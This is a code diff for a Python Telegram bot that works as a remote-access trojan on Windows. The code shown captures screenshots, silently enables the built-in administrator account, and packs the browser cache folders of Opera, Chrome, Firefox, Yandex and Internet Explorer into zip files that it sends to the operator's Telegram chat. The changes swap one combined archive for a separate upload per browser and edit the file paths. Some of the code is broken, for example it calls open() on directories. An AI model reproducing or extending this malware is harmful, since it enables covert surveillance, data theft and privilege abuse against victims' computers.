@@ -57,7 +57,6 @@ async def echo(message: types.message):
         with open('screenshot.jpg', 'rb') as photo:
             await bot.send_document(chat_id=message.chat.id, document=photo)
             os.remove('screenshot.jpg')
-        await message.answer(message.chat.id)
 
     elif message.text == '/screen':
         pyautogui.screenshot("screenshot.jpg")
@@ -69,73 +68,70 @@ async def echo(message: types.message):
         os.system('net user administrator /active:yes')
         name = getpass.getuser()
         disk = abspath(__name__)[0]
-        main_zip = zipfile.ZipFile('cache.zip', 'w')
-
         try:
             opera = zipfile.ZipFile('opera.zip', 'w')
-            dir = open(f'{disk}:\Users\{name}\AppData\Local\Opera Software\Opera Stable\Cache')
+            dir = open(f'{disk}://Users//{name}//AppData//Local//Opera Software//Opera Stable\Cache')
             for file in dir:
                 opera.write(file)
             dir.close()
             opera.close()
-            main_zip.write('opera.zip')
+            await bot.send_document(document='opera.zip', chat_id=message.chat.id)
         except:
             pass
 
         try:
             chrome = zipfile.ZipFile('chrome.zip', 'w')
-            dir = open(f'{disk}:\Users\{name}\AppData\Local\Google\Chrome\User Data\Default\Cache')
+            dir = open(f'{disk}://Users//{name}//AppData//Local//Google//Chrome//User Data//Default//Cache')
             for file in dir:
                 chrome.write(file)
             dir.close()
-            dir = open(f'{disk}:\Users\{name}\AppData\Local\Google\Chrome\User Data\Profile 1\Cache')
+            dir = open(f'{disk}://Users//{name}//AppData//Local//Google//Chrome//User Data//Profile 1//Cache')
             for file in dir:
                 chrome.write(file)
             dir.close()
             chrome.close()
-            main_zip.write('chrome.zip')
+            await bot.send_document(document='chrome.zip', chat_id=message.chat.id)
         except:
             pass
 
         try:
             firefox = zipfile.ZipFile('firefox.zip', 'w')
-            dir = open(f'{disk}:\Users\{name}\AppData\Local\Mozilla\Firefox\Profiles\zxcvb5678.default\cache2\entries')
+            dir = open(
+                f'{disk}://Users//{name}//AppData//Local//Mozilla//Firefox//Profiles//zxcvb5678.default//cache2//entries')
             for file in dir:
                 firefox.write(file)
             dir.close()
             firefox.close()
-            main_zip.write('firefox.zip')
+            await bot.send_document(document='firefox.zip', chat_id=message.chat.id)
 
         except:
             pass
 
         try:
             yandex = zipfile.ZipFile('yandex.zip', 'w')
-            dir = open(f'{disk}:\Users\{name}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Cache')
+            dir = open(f'{disk}://Users//{name}//AppData//Local//Yandex//YandexBrowser//User Data//Default//Cache')
             for file in dir:
                 yandex.write(file)
             dir.close()
             yandex.close()
-            main_zip.write('yandex.zip')
+            await bot.send_document(document='yandex.zip', chat_id=message.chat.id)
         except:
             pass
 
         try:
             InternetExplorer = zipfile.ZipFile('InternetExplorer.zip', 'w')
-            dir = open(f'{disk}:\Users\Admin\AppData\Local\Microsoft\Windows\INetCache\ ')
+            dir = open(f'{disk}://Users//Admin//AppData//Local//Microsoft//Windows//INetCache// ')
             for file in dir:
                 InternetExplorer.write(file)
             dir.close()
-            dir = open(f'{disk}:\Users\Admin\AppData\Local\Microsoft\Windows\Temporary Internet Files\ ')
+            dir = open(f'{disk}://Users//Admin//AppData//Local//Microsoft//Windows//Temporary Internet Files// ')
             for file in dir:
                 InternetExplorer.write(file)
             dir.close()
             InternetExplorer.close()
-            main_zip.write('InternetExplorer.zip')
+            await bot.send_document(document='InternetExplorer.zip', chat_id=message.chat.id)
         except:
             pass
-        await bot.send_document(document=main_zip, chat_id=message.chat.id)
-        main_zip.close()
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
